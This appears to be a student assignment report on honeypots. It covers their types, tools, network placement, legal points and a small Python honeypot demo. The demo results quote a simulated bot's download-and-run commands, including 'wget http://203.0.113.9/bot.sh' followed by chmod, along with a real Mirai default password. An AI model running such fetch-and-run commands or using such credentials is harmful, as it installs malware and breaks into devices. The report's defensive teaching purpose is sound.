# Assignment 7: Study of Honeypot

## 1. What is a Honeypot?
A **honeypot** is a decoy computer system set up to attract attackers. It looks like a real, valuable target (a server, router or database) but has no production use. Because no legitimate user should ever connect to it, **every interaction is suspicious by definition**. That makes its logs very high quality, with almost no false positives.

> "A honeypot is an information system resource whose value lies in unauthorized or illicit use of that resource." (Lance Spitzner, The Honeynet Project)

## 2. Purpose
- **Detection:** early warning that someone is scanning or attacking the network
- **Research:** learn attackers' tools, passwords, commands and malware
- **Deception / delay:** waste the attacker's time away from real systems
- **Forensics:** collect evidence (IPs, timestamps, payloads) for an investigation
- **Threat intelligence:** share malicious IPs, hashes and patterns

## 3. Classification

### By Level of Interaction

| | Low interaction | Medium interaction | High interaction |
| --- | --- | --- | --- |
| What it is | Emulates service banners / login prompts | Emulates a shell and file system | A real OS and real services |
| Attacker can | Connect, try passwords | Run fake commands, download files | Do anything (fully compromise it) |
| Risk | Very low | Low | High (can be used to attack others) |
| Data collected | Connections, credentials | + commands, malware samples | Everything, including new exploits |
| Effort to run | Easy | Moderate | Hard (needs isolation and monitoring) |
| Examples | **this project**, Honeyd, Dionaea | **Cowrie** (SSH/Telnet), Glastopf | Real VM inside a **Honeynet** |

### By Purpose
- **Production honeypot:** placed inside a company network to detect intruders (mainly low interaction)
- **Research honeypot:** run by universities / security teams to study attackers (mainly high interaction)

### By Deployment and Type
- **Server-side** (waits for attackers) vs **client-side** honeypot (visits malicious websites, e.g. Thug)
- **Honeynet:** a network of honeypots with a monitoring gateway (Honeywall)
- **Honeytoken:** fake data, such as a fake AWS key, a fake DB record or a fake email address, that raises an alert when used
- **Spam honeypot / spamtrap:** email address published only to catch spammers
- **Database honeypot:** fake database to catch SQL injection

## 4. Popular Honeypot Tools

| Tool | Type | Emulates |
| --- | --- | --- |
| **Cowrie** | Medium interaction | SSH and Telnet shell, records sessions |
| **Dionaea** | Low interaction | SMB, HTTP, FTP, MSSQL; captures malware |
| **Honeyd** | Low interaction | Thousands of virtual hosts / OS fingerprints |
| **Conpot** | Low interaction | Industrial control systems (SCADA, Modbus) |
| **Glastopf / SNARE** | Web | Vulnerable web applications |
| **T-Pot** | Platform | 20+ honeypots with an ELK dashboard (Docker) |
| **Kippo** | Medium interaction | SSH (older; Cowrie replaced it) |

## 5. Placement in the Network

```
              Internet
                  │
            [ Firewall ]
         ┌────────┴────────┐
       DMZ               Internal LAN
   web, mail,            staff PCs, servers
   HONEYPOT (1)          HONEYPOT (2)
```
1. **In the DMZ / before the firewall:** sees Internet-wide scanning and attacks.
2. **Inside the LAN:** any hit means an attacker or malware is already inside (a very strong alert).

## 6. Advantages and Disadvantages

| Advantages | Disadvantages |
| --- | --- |
| Very few false positives | Sees only attacks aimed at itself |
| Catches new / unknown attacks | Can be fingerprinted and avoided by skilled attackers |
| Small amount of high-value data | High-interaction honeypots can be taken over and used to attack others |
| Cheap: old hardware or a VM | Needs regular monitoring and maintenance |
| Works with encrypted traffic (it is the endpoint) | Legal questions (privacy, entrapment) |

## 7. Legal and Ethical Points
- **Entrapment** does not apply: the honeypot does not invite anyone to commit a crime, it only waits.
- **Privacy:** logs may contain personal data, so collect only what is needed and protect it.
- **Liability:** if an attacker uses your honeypot to attack others, you may be responsible. Isolate it and limit outbound traffic.
- In India, unauthorised access is an offence under the **IT Act 2000, Section 43 and 66**. Honeypot logs can support a complaint.

## 8. Practical: Low-Interaction Honeypot (`honeypot.py`)

| Fake service | Port | What it records |
| --- | --- | --- |
| SSH (OpenSSH 7.4 banner) | 2222 | Connection, attacker's SSH client version |
| Telnet (Debian login + fake root shell) | 2323 | Every username/password, every command typed |
| HTTP (router admin login page) | 8080 | Paths scanned, User-Agent, submitted credentials |

```bash
python honeypot.py --demo     # honeypot + simulated attackers + summary
python honeypot.py            # run it, then attack it yourself:
telnet 127.0.0.1 2323         #   try admin/admin, then type commands
ssh -p 2222 root@127.0.0.1    #   banner is captured
# browser: http://127.0.0.1:8080/admin   submit the login form
python honeypot.py --summary  # statistics from honeypot_log.jsonl
```

### Demo Result
The simulated attackers behave like real bots:
- **SSH scanner:** client `libssh2_1.9.0` recorded
- **Mirai-style Telnet bot:** tried `admin/admin123`, `root/vizxv` (a real Mirai default), `root/123456`. After the fake login it ran `whoami`, `uname -a`, `cd /tmp`, `wget http://203.0.113.9/bot.sh`, `chmod +x bot.sh`, which is the typical download-and-run-malware pattern.
- **Web scanners:** probed `/admin` and `/.env` (leaked secrets file), and Hydra tried `admin/password`

### Safety
- By default it listens only on `127.0.0.1`. Use `--public` only inside an isolated lab VM or network.
- Nothing is executed: commands are only recorded and answered with fixed fake text.
- `wget` URLs are logged, never downloaded.

## 9. Conclusion
Honeypots turn the attacker's actions into evidence. A low-interaction honeypot, like the one built here, is safe and simple. It records who attacked, from where, with which passwords and what they tried to do next. That data can be used to block IPs, change weak default passwords and update IDS rules (Assignment 6).
